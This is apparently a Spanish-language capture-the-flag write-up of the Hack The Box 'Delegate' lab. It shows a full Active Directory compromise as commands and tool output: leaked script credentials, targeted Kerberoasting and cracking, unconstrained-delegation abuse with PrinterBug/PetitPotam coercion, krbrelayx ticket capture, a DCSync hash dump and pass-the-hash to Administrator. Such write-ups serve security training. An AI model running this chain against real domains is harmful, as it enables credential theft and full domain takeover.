---
tags:
title: Delegate - Medium (HTB)
permalink: /Delegate-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49668,49670,52813,59102,61936,61937,61941,62124 10.129.234.69
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-13 16:43 -0300
Nmap scan report for 10.129.234.69
Host is up (0.81s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-13 19:45:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-13T19:47:11+00:00; +1m38s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-01-12T19:42:00
|_Not valid after:  2026-07-14T19:42:00
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-13T19:46:36+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
52813/tcp open  msrpc         Microsoft Windows RPC
59102/tcp open  msrpc         Microsoft Windows RPC
61936/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61937/tcp open  msrpc         Microsoft Windows RPC
61941/tcp open  msrpc         Microsoft Windows RPC
62124/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-13T19:46:32
|_  start_date: N/A
|_clock-skew: mean: 1m37s, deviation: 0s, median: 1m37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.19 seconds
```
### spider_plus

Use el modulo `spider_plus` de nxc, para enumerar todos los `Shares`.

```bash
nxc smb 10.129.234.69 -u 'guest' -p '' -M spider_plus

SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SPIDER_PLUS 10.129.234.69   445    DC1              [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.234.69   445    DC1              [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.234.69   445    DC1              [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.234.69   445    DC1              [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.234.69   445    DC1              [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.234.69   445    DC1              [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.234.69   445    DC1              [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
4SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.129.234.69   445    DC1              [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.234.69.json".
SPIDER_PLUS 10.129.234.69   445    DC1              [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.234.69   445    DC1              [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.234.69   445    DC1              [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.234.69   445    DC1              [*] Total folders found:  19
SPIDER_PLUS 10.129.234.69   445    DC1              [*] Total files found:    7
SPIDER_PLUS 10.129.234.69   445    DC1              [*] File size average:    1.15 KB
SPIDER_PLUS 10.129.234.69   445    DC1              [*] File size min:        22 B
SPIDER_PLUS 10.129.234.69   445    DC1              [*] File size max:        3.86 KB
```

### Credentials

Luego analice el contenido del archivo `json`. Viendo que en ambos recursos esta el archivo `users.bat`.

```json
{
  "NETLOGON": {
    "users.bat": {
      "atime_epoch": "2023-08-26 09:54:29",
      "ctime_epoch": "2023-08-26 09:45:24",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "159 B"
    }
  },
  "SYSVOL": {
    "delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2023-09-09 11:10:32",
      "ctime_epoch": "2023-08-26 06:39:30",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "22 B"
    },
    "delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2023-08-26 08:24:26",
      "ctime_epoch": "2023-08-26 06:39:30",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "1.07 KB"
    },
    "delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
      "atime_epoch": "2023-08-26 07:01:56",
      "ctime_epoch": "2023-08-26 07:01:56",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "2.73 KB"
    },
    "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2023-09-09 11:10:32",
      "ctime_epoch": "2023-08-26 06:39:30",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "22 B"
    },
    "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2023-09-09 08:17:20",
      "ctime_epoch": "2023-08-26 06:39:30",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "3.86 KB"
    },
    "delegate.vl/scripts/users.bat": {
      "atime_epoch": "2023-08-26 09:54:29",
      "ctime_epoch": "2023-08-26 09:45:24",
      "mtime_epoch": "2023-10-01 06:08:32",
      "size": "159 B"
    }
  }
}
```

Por lo que me lo descargue a mi maquina, y es asi como viendo el contenido, se ven dos usuarios y una password.

```bash
cat users.bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```
### Validate user

Use `crackmapexec` para validarlas, y vi que son validas para el usuario `A.Briggs`.

```bash
crackmapexec smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'     
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
```
## Shell as N.Thompson

### Valid users

Use las mismas credenciales para enumerar usuarios validos con `rpcclient`.

```bash
rpcclient -U 'A.Briggs%P4ssw0rd1#123' 10.129.234.69
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[A.Briggs] rid:[0x450]
user:[b.Brown] rid:[0x451]
user:[R.Cooper] rid:[0x452]
user:[J.Roberts] rid:[0x453]
user:[N.Thompson] rid:[0x454]
```
### Bloodhound

Intente ataques como `Kerberoasting` y `AS-REP` pero no tuvieron caso, así que recolecte la información del dominio con `bloodhound-python`.

```bash
bloodhound-python -ns 10.129.234.69 -u A.Briggs -p 'P4ssw0rd1#123' -d delegate.vl -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::8aba:ebd1:1aa1:74ab
INFO: Trying LDAP connection to dead:beef::8aba:ebd1:1aa1:74ab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::8aba:ebd1:1aa1:74ab
INFO: Trying LDAP connection to dead:beef::8aba:ebd1:1aa1:74ab
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
INFO: Done in 01M 36S
```
### Targeted kerberoast

Viendo los privilegios de mi usuario, veo que posee `GenericWrite` sobre el usuario `N.Thompson`.

![image-center](/assets/images/Pasted image 20260113170411.png)

Para eso use [targetedKerberoas.py](https://github.com/ShutdownRepo/targetedKerberoast), lo cual busca una cuenta sobre la que el usuario que proveamos las credenciales tenga el control, y se encarga de añadirle un `spn` para luego hacer un `Kerberoasting` y así recuperar un hash `NTLMv2`.

```bash
python3 targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$0069aea625411576eb5ab0f5f0734bf4$f9cab25cf57a372dba1cbb7c1303533274c187f672991eb74a011d8d023aaa2bdb8bcbda5aa34a767d0cd5074aa6fec7f7899667654ea22c02aa5e65239638968400876273891100aaf7093c22de890596d1d901c17d04b2ae444b0bbc049f92460845a3a40d2bdf4231a803a6f49cf6f2f79131b4eecb1c3321aabfee565b15b9d2f753ac7647799582e949f06d58390d83b7f72418166ee1b3c4c02cedfdb3ac02ae76a1e2368c652f24677d3ec9f6029d4775cf261cf11442d557c1b8b3cb428ee53be182e8b9cac0058f8e34c25ee1a7b259658672bac450bd0c1114bc58eb8f7eafe2d285551746bb490fecceaf59c8492b0e9f89a7a8a633be2f4ba6437a2eabb4b9a95e9f6ed703a7d8a10d9f81add8c2becc71ceea9166f299a42442ba223dd8f6ba21929bf53fd4bd29d4f9ccd7fa94083a8b6555e0d70bf8e17f81aa63991c64355871a0d3ad965fc16c2d7f1f64f0c5da90a463df3382e1c5c202fcc569419287792564958cdb488f9cc5921d25a83e957769f7e2ff60da2e997535f3773d307f811bf100a3e0e270f32ce7be973deb2a6e594ec798e1b85f9c9940a3a2b4f2dabd973170cc3e09963139597d7405dad25b5fe2e8d152c55c4eccc1e885170b32bf2a05a7fc145ad7c0a75071dd159e0de28fca59c14a3931e376d894e0ecf87a2ad802df4ad0f0e6b27fd928785052d955f0004abf46e8b7321a5dc2fe1a0ef3dcb99a16624f3c8c5dd62febdaa4e81a867a584b5bc1f809d0343bc2d24cb95def64dffeab8afcfbeb7e44f712655019924345fa0e79f53b87fbd0bd11282e8b5252d77495e546c1de09e52a0bf0fcbee4822364948731229c09442371df85cdd41004b2a847e50149bdf65a09d0c7cf0ddf4f1c918ff53fe4f1bc8069de64657dfe0e44da0af1c41bc7f840e87561b2f7222f5651e55d4a2f78672f16eae79f1f043e2051a9693181b570c46530e1704c918d89739f8693703db84904da755d22a857f5365027dcd24634a9f07632e0abad05579ad4fac8e3fdb04701bab5a7f315e677de11586b9b7624fd7176ad7d4a7b0cfd0cb4776d5a790d5497582531a20c52d6c342c697c14049fae29449a7c91499612eefeae03394bc6c3908d84f7867b5b6fb3190a41c63b8c7505d962208c8d976033b1a8694454ef4cb44b449994f7570b7b5b5816d3a266e925945c49edb8e9556df84e5a8ac6b2a3c7c848a7e348cc7a0ba803c5b866b8d6327314cf18dd2881dc90afc25611e05f412eb462af86398074d4f3e6408ff375d0cf79961c30dce40c1b498911122c731d1cdb7f54d7e42482182fa307b4b13221395856f217142cb4a7c3a376247a4c98e8fba1c534f27d5ca320729bd228b27ff57ef0dedd185b5e81af5c1d076471152489265b464c6e56f55db0d9b75e2ff83559095ae666d0511615174cd81934e12
[VERBOSE] SPN removed successfully for (N.Thompson)
```

### Crack password

Use `john` para romper dicho hash.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
KALEB_2341       (?)     
1g 0:00:00:04 DONE (2026-01-13 17:06) 0.2331g/s 2564Kp/s 2564Kc/s 2564KC/s KANECHA1..KALA535
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Shell

Y como este usuario es parte del grupo `Remote Management Users` puedo conectarme al servicio de `WinRM`.

![image-center](/assets/images/Pasted image 20260113170638.png)

Para conectarme use `evil-winrm`.

```powershell
evil-winrm -i delegate.vl -u n.thompson -p 'KALEB_2341'

Evil-WinRM shell v3.9

/var/lib/gems/3.3.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> type ../desktop/user.txt
6a951013903d91767dc82b81f059826f
```
## Shell as administrator

Viendo los privilegios de este usuario veo que cuenta con `SeEnableDelegationPrivilege`.

```powershell
Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

```

Lo que indica que puedo agregar una computadora, para luego otorgarle permisos de delegacion.
### Add computer

Para agregar una computadora al dominio use `bloodyAD`.

```bash
bloodyAD -u n.thompson -p 'KALEB_2341' -d delegate.vl --dc-ip 10.129.234.69 add computer zsln 'zsln@123' 
[+] zsln created
```

Para seguir, use de referencia este [post](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/) 
### Add DNS record

Después necesito agregar un récord DNS para que el dominio pueda comunicarse con mi `hoat`.

```bash
python3 dnstool.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -r 'zs1n.delegate.vl' -a add -t A -d '10.10.17.19' 10.129.234.69
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Luego con `addspn` le modifico el `spn` 

```bash
python3 addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t 'zsln$' -s 'cifs/zs1n.delegate.vl' 'DC1.delegate.vl' --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Por ultimo necesito configurar mi servidor, pero para eso necesito calcular el hash `NT` de mi computadora creada.

```bash
iconv -f ascii -t utf16le <(printf 'zsln@123') | openssl dgst -md4
MD4(stdin)= dd3e6f2b0a111f987a406ea2f5859cab
```

### Give Unconstrained Delegation

Ya después le doy `Unconstrained Delegation` a mi computadora con `bloodyAD`.

```bash
bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host DC1.delegate.vl add uac 'zsln$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to zsln$'s userAccountControl
```

```bash
netexec smb DC1.delegate.vl  -u 'zsln$' -p 'zsln@123' -k -M coerce_plus -o LISTENER=zs1n.delegate.vl METHOD=PrinterBug
/usr/lib/python3/dist-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
SMB         DC1.delegate.vl 445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) 
SMB         DC1.delegate.vl 445    DC1              [+] delegate.vl\zsln$:zsln@123 
COERCE_PLUS DC1.delegate.vl 445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS DC1.delegate.vl 445    DC1              Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx

```

Luego de iniciar el relay `--> python3 krbrelayx.py -hashes :dd3e6f2b0a111f987a406ea2f5859cab` use petitpotam.py para poder hacer coerción del `DC` contra mi maquina.

```bash
python3 petitpotam.py  -u 'zsln$' -d delegate.vl -p 'zsln@123' 'zs1n.delegate.vl' '10.129.234.69'                    

<SNIP>

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.129.234.69[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Y puedo ver como desde mi otra consola, recibo el ticket del `DC1`.

```bash
python3 krbrelayx.py -hashes :dd3e6f2b0a111f987a406ea2f5859cab   
/home/zsln/Desktop/zsln/htb/delegate/krbrelayx/lib/clients/__init__.py:17: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import os, sys, pkg_resources
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.234.69
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.234.69
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```
### DCSync attack

Con el mismo ticket, lo exporte `(export KRB5CCNAME=DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache)`, y luego con `secretsdump`, dumpee los hashes del dominio.

```bash
impacket-secretsdump -k -no-pass 'delegate.vl/DC1$@DC1.delegate.vl'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
zsln$:4601:aad3b435b51404eeaad3b435b51404ee:dd3e6f2b0a111f987a406ea2f5859cab:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe                                          
Administrator:des-cbc-md5:ce257f16ec25e59e                                                                          
krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70                                                 
krbtgt:des-cbc-md5:ef491c5b736bd04c                                                                                 
A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
A.Briggs:des-cbc-md5:38da2a92611631d9                                                                               
b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
b.Brown:des-cbc-md5:ce407ac8d95ee6f2
R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
R.Cooper:des-cbc-md5:a70e158c75ba4fc1
J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
J.Roberts:des-cbc-md5:6858c8d3456451f4
N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
N.Thompson:des-cbc-md5:7cab43c191a7ecf2
DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
DC1$:des-cbc-md5:9e16cd46ad54cba7
zsln$:aes256-cts-hmac-sha1-96:fac03ec5fe1e86d1fb761af4def17f1a76c075fde9ab83ea604a643bfa7140c2
zsln$:aes128-cts-hmac-sha1-96:c3cbe9e9cba0056f56cf76828278c7f9
zsln$:des-cbc-md5:cdd0858ab59d43ad
[*] Cleaning up..
```
### Shell

Con lo que luego hice la conexión, proporcionando el propio `hash` del usuario `Administrator`.

```powershell
evil-winrm -i delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
98f5f0b2949c7a7512ce625dff14c98a
```

`~Happy Hacking.`